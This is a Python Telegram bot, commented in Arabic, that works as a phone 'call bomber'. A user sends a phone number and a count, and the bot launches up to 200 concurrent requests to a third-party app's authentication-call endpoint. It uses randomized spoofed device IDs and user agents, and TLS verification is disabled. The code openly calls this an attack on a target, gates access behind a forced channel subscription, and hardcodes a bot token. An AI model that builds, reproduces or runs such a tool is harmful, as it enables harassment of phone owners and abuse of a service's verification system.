import asyncio
import httpx
import random
import uuid
import time
from aiogram import Bot, Dispatcher, types
from aiogram.utils import executor

# --- [إعدادات النظام] ---
API_TOKEN = '8502144502:AAH7qoO1HGNoLVFirXI50pgAKOmVu73JL1A'
ADMIN_ID = 8327207111
CHANNELS = ["@Call_Netro"]

bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# --- [محرك توليد الهويات] ---
def generate_headers():
    android_id = "".join(random.choices("abcdef0123456789", k=16))
    session_uuid = str(uuid.uuid4())
    user_agent = f"Telz-Android/{random.randint(15, 20)}.0.1 (Linux; U; Android {random.randint(10, 14)})"
    return {
        'User-Agent': user_agent,
        'Content-Type': "application/json",
        'X-Request-ID': str(uuid.uuid4())
    }, android_id, session_uuid

# --- [فحص الاشتراك الإجباري] ---
async def check_sub(user_id):
    if user_id == ADMIN_ID: return True
    for channel in CHANNELS:
        try:
            member = await bot.get_chat_member(chat_id=channel, user_id=user_id)
            if member.status in ['left', 'kicked']: return False
        except: return False
    return True

# --- [المحرك النفاث لإرسال الطلبات] ---
async def send_request(client, target_phone):
    headers, android_id, session_uuid = generate_headers()
    payload = {
        "android_id": android_id,
        "event": "auth_call",
        "phone": f"+{target_phone}",
        "ts": int(time.time()*1000),
        "uuid": session_uuid
    }
    try:
        # إرسال الطلب بدون انتظار الرد لزيادة السرعة القصوى
        await client.post("https://api.telz.com/app/auth_call", json=payload, headers=headers, timeout=5)
        return True
    except:
        return False

async def start_attack(target_phone, count):
    # فتح سيشن عملاق لإرسال الطلبات متوازية
    limits = httpx.Limits(max_connections=1000, max_keepalive_connections=500)
    async with httpx.AsyncClient(limits=limits, verify=False) as client:
        tasks = [send_request(client, target_phone) for _ in range(count)]
        results = await asyncio.gather(*tasks)
        return sum(results)

# --- [معالجة الأوامر] ---
@dp.message_handler(commands=['start'])
async def welcome(message: types.Message):
    if not await check_sub(message.from_user.id):
        markup = types.InlineKeyboardMarkup()
        for ch in CHANNELS:
            markup.add(types.InlineKeyboardButton(f"Join {ch}", url=f"https://t.me/{ch.replace('@','')}"))
        await message.reply("⚠️ **ACCESS DENIED**\nيجب الاشتراك بالقناة أولاً.", reply_markup=markup)
        return
    await message.reply("🔥 **NETRO ENGINE 2099 ONLINE**\nأرسل الرقم والعدد (مثال: 9647701234567 50)")

@dp.message_handler()
async def handle_input(message: types.Message):
    if not await check_sub(message.from_user.id): return
    
    data = message.text.split()
    if len(data) < 2: return
    
    target_phone = data[0].strip('+')
    try:
        count = int(data[1])
        if count > 200: count = 200 # سقف الحماية
    except: return

    wait_msg = await message.answer(f"🚀 **جارِ إرسال {count} طلب بنفس اللحظة...**")
    
    # تنفيذ الهجوم
    success = await start_attack(target_phone, count)
    
    await bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=wait_msg.message_id,
        text=f"🎯 **BATCH COMPLETE**\nTarget: `+{target_phone}`\nSuccess: `{success}/{count}`",
        parse_mode="Markdown"
    )

# --- [تشغيل التيرمينال] ---
if __name__ == '__main__':
    print("--- ARCHITECT SYSTEM: DEPLOYED ---")
    executor.start_polling(dp, skip_updates=True)
